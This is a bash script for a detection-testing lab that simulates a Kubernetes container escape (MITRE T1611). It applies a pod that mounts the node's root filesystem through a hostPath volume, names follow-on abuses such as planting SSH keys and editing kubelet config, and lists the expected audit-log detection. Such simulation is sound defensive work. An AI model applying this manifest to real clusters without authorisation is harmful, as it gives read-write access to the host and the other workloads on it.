#!/bin/bash
# ============================================================================
# Attack Simulation: hostPath Volume Mount (Container Breakout Vector)
# MITRE ATT&CK: T1611 - Escape to Host
# Stratus technique: k8s.privilege-escalation.hostpath-mount
# Run from: kubectl exec -it kubectl -n attacker -- /bin/sh
# Fires detection: detections/kql/hostpath-volume.kql   (table: AKSAuditAdmin)
# ============================================================================
#
# TACTIC: Privilege Escalation (TA0004) / Escape to Host (T1611). A `hostPath` volume
# mounts a directory from the NODE's filesystem into the pod. Mounting the node root
# (`/`) lets a container read/write the host — dropping SSH keys, editing kubelet
# config, or reading other pods' data — which is a classic breakout to the node.
#
# THIS IS AN INTENTIONAL ATTACK SIMULATION for detection testing.
#
# WHAT A DEFENDER SHOULD SEE: an AKSAuditAdmin `create pods` whose spec declares a
# hostPath volume, especially with a sensitive path like `/`. Admission policy should
# restrict or forbid hostPath.

# Abort on first error.
set -e
# Unique per-run pod name.
POD="adversary-lab-hostpath-$(date +%s)"

echo "[*] Creating pod mounting the node root filesystem: $POD (namespace: victim)"
# Apply an inline Pod manifest into the "victim" namespace.
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: $POD
  namespace: victim
  labels: { adversary-lab/cleanup: "true", adversary-lab/mitre: "T1611" }
spec:
  containers:
    - name: host
      image: busybox:1.36                 # minimal image
      command: ["sleep", "3600"]          # idle so the pod stays Running
      volumeMounts:
        - name: noderoot
          mountPath: /host                # host's / becomes /host inside the container
  volumes:
    - name: noderoot
      hostPath:                    # <-- the signal the detection matches
        path: /                    # the NODE's root filesystem
        type: Directory            # require it to already exist as a directory
EOF

echo ""
# Operator-facing hints plus manual cleanup.
echo "[*] Expected detection: T1611 - hostPath Volume Mount"
echo "[*] Expected log table: AKSAuditAdmin"
echo "[!] Cleanup: kubectl delete pod $POD -n victim"
